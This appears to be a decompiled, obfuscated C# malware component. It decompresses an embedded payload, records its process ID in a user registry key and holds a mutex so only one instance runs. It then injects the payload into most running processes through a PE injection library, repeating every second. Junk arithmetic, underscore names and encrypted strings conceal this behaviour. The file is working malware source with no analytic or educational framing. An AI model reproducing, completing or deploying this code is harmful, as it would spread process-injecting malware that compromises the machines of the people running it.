using InjectionLibrary;
using JLibrary.PortableExecutable;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Timers;

[StandardModule]
internal sealed class ________________________________________________________________________________
{
	private static string _;

	private static byte[] __;

	private static string ___;

	private static Mutex ____;

	private static bool _____;

	static ________________________________________________________________________________()
	{
		________________________________________________________________________________._ = <Module>.__________(29364, Type.EmptyTypes.Length + 33096, (int)(sizeof(int) + 239));
		________________________________________________________________________________.___ = <Module>.____<string>(-1389591929);
		________________________________________________________________________________._____ = false;
	}

	public static void _()
	{
		RegistryKey registryKey = null;
		int id = 0;
		int num;
		object length;
		int num1;
		try
		{
			int ______ = <Module>.__________;
			if ((-(______ & 1073740712) ^ 7228) == 0)
			{
				goto Label0;
			}
			if (______________________________________________________________.______________________)
			{
				________________________________________________________________________________.__ = ___________________________________________________________________._______(__________________________________________________________________________.____, <Module>.____<string>(606130436));
				num = -30446;
				(id * (25190400 * id - (______ << 7)) ^ 3053) == 0;
				________________________________________________________________________________.__ = ________________________________________________________________________________.______(________________________________________________________________________________.__);
				registryKey = Registry.CurrentUser.OpenSubKey(<Module>.______<string>(-255444469), true);
				length = sizeof(float) + -3;
				goto Label1;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
	Label2:
		string str = <Module>._______<string>(-1001526797);
		id = Process.GetCurrentProcess().Id;
		registryKey.SetValue(str, RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(id.ToString())));
		int ____ = ______________________._______;
		if ((____ * 43 + 21 * ____ ^ -2016704023) != 0)
		{
			num1 = (int)(sizeof(Guid) + 3880);
		}
		else
		{
			num1 = ((____ / 302 ^ -2948) == 2835 ? Type.EmptyTypes.Length + -416052288 : 1899178091);
		}
		num = num1;
		int ______1 = <Module>.A;
		length = (______1 + 15452 == ______1 * 2 + ______1 % 16 + ______1 * 6 ? Type.EmptyTypes.Length + 979950861 : Type.EmptyTypes.Length + 2);
	Label1:
		while (true)
		{
			switch (length)
			{
				case 0:
				{
					goto Label2;
				}
				case 1:
				{
					registryKey.SetValue(<Module>._____<string>(1556395407), RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(_____________________________________________________________________________.__)));
					length = Type.EmptyTypes.Length + 3;
					continue;
				}
				case 2:
				{
					break;
				}
				case 3:
				{
					goto Label3;
				}
				default:
				{
					goto case 1;
				}
			}
		}
		registryKey.Close();
		________________________________________________________________________________.___ = Process.GetCurrentProcess().ProcessName.ToString();
		string str1 = <Module>.___<string>(-1617572493);
		id = Process.GetCurrentProcess().Id;
		________________________________________________________________________________._ = string.Concat(str1, id.ToString(), <Module>.______<string>(861631917));
		if (num != 3896)
		{
		}
		while (true)
		{
			Thread.Sleep(1000);
			________________________________________________________________________________.__();
			if (________________________________________________________________________________._____)
			{
				break;
			}
		}
		________________________________________________________________________________._____();
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += new ElapsedEventHandler(________________________________________________________________________________._______);
		timer.Interval = 1000;
		timer.Start();
		Thread.Sleep(-1);
		return;
	Label3:
		registryKey.SetValue(<Module>.____<string>(-2026251395), RuntimeHelpers.GetObjectValue(________________________________________________________________________________.___(______________________________________________________________.__________________)));
		goto Label2;
	}

	public static void __()
	{
		try
		{
			________________________________________________________________________________.____ = new Mutex(false, ______________________________________________________________.__________________);
			if (________________________________________________________________________________.____.WaitOne(0, false))
			{
				________________________________________________________________________________._____ = true;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static object ___(string string_0)
	{
		return string_0;
	}

	public static void ____(int int_0)
	{
		try
		{
			InjectionMethod injectionMethod = InjectionMethod.Create(2);
			using (PortableExecutable portableExecutable = new PortableExecutable(________________________________________________________________________________.__))
			{
				injectionMethod.Inject(portableExecutable, int_0);
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			int length = checked((int)processes.Length) - 1;
			for (int i = 0; i <= length; i++)
			{
				Process process = processes[i];
				try
				{
					while (true)
					{
						string str = <Module>.____<string>(-1286171096);
						int id = process.Id;
						string str1 = string.Concat(str, id.ToString(), <Module>.____<string>(-1286171096));
						int num = Type.EmptyTypes.Length + 28310;
						switch (((id * 34 + id * 222 << 26) + id - 918359351 != id ? Type.EmptyTypes.Length + 0 : Type.EmptyTypes.Length + -1147819050))
						{
							default:
							{
								if (________________________________________________________________________________._.Contains(str1))
								{
									goto Label0;
								}
								________________________________________________________________________________._ = string.Concat(________________________________________________________________________________._, str1);
								int num1 = num;
								num = -26979;
								if (num1 == 28310)
								{
									string fullPath = Path.GetFullPath(process.MainModule.FileName);
									id = process.Id;
									string.Concat(fullPath, id.ToString());
									if ((8 * <Module>._______________ / 16777216 ^ 139526) != 0)
									{
										if (num == 2882)
										{
											continue;
										}
									}
								}
								break;
							}
						}
					}
					if (!process.MainModule.FileName.Contains(<Module>.___<string>(-968772176)) && !process.MainModule.FileName.Contains(<Module>.___<string>(-1291330515)) && !process.MainModule.FileName.Contains(________________________________________________________________________________.___))
					{
						________________________________________________________________________________.____(process.Id);
					}
				Label0:
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] ______(byte[] byte_0)
	{
		byte[] numArray;
		MemoryStream memoryStream = new MemoryStream();
		DeflateStream deflateStream = new DeflateStream(new MemoryStream(byte_0), CompressionMode.Decompress, true);
		switch (sizeof(short))
		{
			default:
			{
				numArray = new byte[4096];
				break;
			}
		}
		while (true)
		{
			int num = deflateStream.Read(numArray, 0, checked((int)numArray.Length));
			if (num <= 0)
			{
				break;
			}
			memoryStream.Write(numArray, 0, num);
		}
		deflateStream.Close();
		return memoryStream.ToArray();
	}

	[DebuggerStepThrough]
	private static void _______(object sender, ElapsedEventArgs e)
	{
		________________________________________________________________________________._____();
	}
}